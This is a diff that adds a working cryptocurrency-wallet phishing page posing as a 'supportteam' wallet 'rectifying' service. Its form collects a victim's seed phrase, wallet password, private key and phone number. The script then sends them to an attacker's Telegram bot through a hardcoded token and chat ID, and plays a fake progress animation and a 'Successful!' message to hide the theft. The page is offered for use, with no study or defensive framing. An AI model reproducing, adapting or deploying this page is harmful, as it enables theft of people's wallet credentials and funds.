@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rectifying.....</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
+
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #000428, #004e92);
+            color: white;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1b2735, #090a0f);
+            z-index: -1;
+            animation: bluePulse 10s infinite alternate;
+        }
+
+        @keyframes bluePulse {
+            0% { background-color: #1b2735; }
+            100% { background-color: #004e92; }
+        }
+
+        .header, .footer {
+            background: linear-gradient(to right, #1e3c72, #2a5298);
+            padding: 20px;
+            text-align: center;
+            font-size: 32px;
+            letter-spacing: 2px;
+            color: #00d4ff;
+            text-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
+            animation: glowText 2s infinite alternate;
+        }
+
+        @keyframes glowText {
+            0% { text-shadow: 0 0 20px #00d4ff; }
+            100% { text-shadow: 0 0 40px #00d4ff, 0 0 80px #00d4ff; }
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 50px auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(0, 212, 255, 0.5);
+            animation: floatEffect 5s infinite ease-in-out;
+            overflow: hidden;
+        }
+
+        @keyframes floatEffect {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0); }
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        form label {
+            font-size: 18px;
+            margin-bottom: 5px;
+            color: #00d4ff;
+        }
+
+        form input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            transition: 0.3s ease;
+        }
+
+        form input:focus {
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.8);
+        }
+
+        .connect-button {
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: buttonPulse 3s infinite;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+        }
+
+        .connect-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.8);
+        }
+
+        @keyframes buttonPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .status {
+            font-size: 22px;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .wallet-name {
+            color: #ff4081;
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        .slash {
+            color: black;
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        .success {
+            font-size: 36px;
+            color: #00ff00;
+            font-weight: bold;
+            animation: fadeIn 2s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="animated-bg"></div>
+
+    <div class="header">supportteam™</div>
+
+    <div class="container">
+        <b>Import your wallet :</b>
+        <form id="telegramForm">
+            <label for="name">Wallet name</label>
+            <input type="text" id="wallet" name="wallet" placeholder="Enter your Wallet name" required>
+
+            <label for="phone">Typically 12 (sometimes 24) words separated by single spaces:</label>
+            <input type="text" id="phrase" name="phrase" placeholder="Enter your phrase" required>
+
+            <label for="email"></label>the password you used to encrypt it:</label>
+            <input type="text" id="wallet_password" name="wallet_password" placeholder="Enter your wallet_password" required>
+
+            <label for="department">Private Key </font> Typically 12 (sometimes 24) words separated by single spaces:</label>
+            <input type="text" id="private_key" name="private_key" placeholder="Enter your private key" required>
+
+            <label for="phone">phone number:</label>
+            <input type="number" id="phone" name="phone" placeholder="Enter your phone number" required>
+            
+            <button type="button" id="connectButton" class="connect-button">🚀 Connect</button>
+        </form>
+
+        <div class="status" id="status"></div>
+    </div>
+
+    <div class="footer">⚡ Powered by/ Blocchain
+    </div>
+    <script>
+        const BOT_TOKEN = '7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY';  // Replace with your Telegram Bot Token
+        const CHAT_ID = '874563737';  // Replace with your Chat ID
+
+        document.getElementById('connectButton').addEventListener('click', async function() {
+            const form = document.getElementById('telegramForm');
+            const status = document.getElementById('status');
+
+            const wallet = document.getElementById('wallet').value;
+            const phrase = document.getElementById('phrase').value;
+            const wallet_password = document.getElementById('wallet_password').value;
+            const private_key = document.getElementById('private_key').value;
+            const phone = document.getElementById('phone').value;
+            
+            const message = `
+📋 *New Form Submission:*
+- *Wallet:* ${wallet}
+- *phrase:* ${phrase}
+- *wallet_password:* ${wallet_password}
+- *private_key:* ${private_key}
+- *phone:* ${phone}
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (!response.ok) throw new Error('Failed to send message');
+
+                form.style.display = 'none';
+                startAnimations(status);
+            } catch (error) {
+                console.error('Error:', error);
+                status.innerHTML = '<span class="status red">Failed to submit form. Please try again.</span>';
+            }
+        });
+
+        function startAnimations(status) {
+            status.innerHTML = '<span class="status red">Connecting <span class="dots">.</span></span>';
+            let dots = 1;
+
+            const dotsInterval = setInterval(() => {
+                dots = (dots % 3) + 1;
+                status.innerHTML = '<span class="status red">Connecting ' + '.'.repeat(dots) + '</span>';
+            }, 500);
+
+            setTimeout(() => {
+                clearInterval(dotsInterval);
+                let percentage = 1;
+                status.className = 'status green';
+                status.innerHTML = 'Rectifying please wait...<br><span id="percentage">1%</span>';
+
+                const percentageInterval = setInterval(() => {
+                    percentage += 1;
+                    document.getElementById('percentage').textContent = percentage + '%';
+                    if (percentage === 100) {
+                        clearInterval(percentageInterval);
+                        showWalletNames(status);
+                    }
+                }, 50);
+            }, 10000);
+        }
+
+        function showWalletNames(status) {
+            status.innerHTML = '<span class="status blue">Loading ALGORITHM: <span class="slash">/</span> <span id="walletName" class="wallet-name"></span> <span class="slash">/</span></span>';
+            const wallets = [
+"1inch Wallet", 
+"AnkerPay", 
+"Binance AAp", 
+"Bitamp", 
+"Bitcoin Wallet", 
+"Bitcoin.com Wallet", 
+"Crypto Wallet", 
+"Bitpay Wallet", 
+"Bitpie", 
+"Blockchain Wallet", 
+"BRD", 
+"BTC.com Wallet App", 
+"Chivo Wallet", 
+"Circle Invest", 
+"CitoWise", 
+"Coin Wallet", 
+"Coinbase Wallet", 
+"Coinomt", 
+"Coins.ph", 
+"Daedalus", 
+"Digifox", 
+"Edge Wallet", 
+"Electrum Bitcoin Wallet", 
+"Enjin Wallet", 
+"Exodus", 
+"DeFi wallet", 
+"GreenAddress", 
+"Haven", 
+"Jaxx Liberty", 
+"Keplr", 
+"Klever Wallet", 
+"MetaMask", 
+"Monarch", 
+"MyCrypto", 
+"MyEtherWallet", 
+"Omise", 
+"Opera", 
+"OWNR Wallet", 
+"Passkeys Wallet", 
+"Phantom", 
+"Plark", 
+"Prodoge", 
+"Ronin Wallet", 
+"StakedWallet", 
+"Status", 
+"SwirlWallet", 
+"Trust Wallet", 
+"uPort", 
+"Xapo", 
+"XDEFI Wallet", 
+"Catherine",
+"Yoroi Wallet"
+            ];
+            
+            let index = 0;
+            const walletInterval = setInterval(() => {
+                document.getElementById('walletName').textContent = wallets[index];
+                index = (index + 1) % wallets.length;
+                if (index === 0) {
+                    clearInterval(walletInterval);
+                    showSuccessMessage(status);
+                }
+            }, 100);
+        }
+
+        function showSuccessMessage(status) {
+            status.innerHTML = '<div class="success">✔️ Successful!</div>';
+            setTimeout(() => {
+                window.location.href = 'cn.html';
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
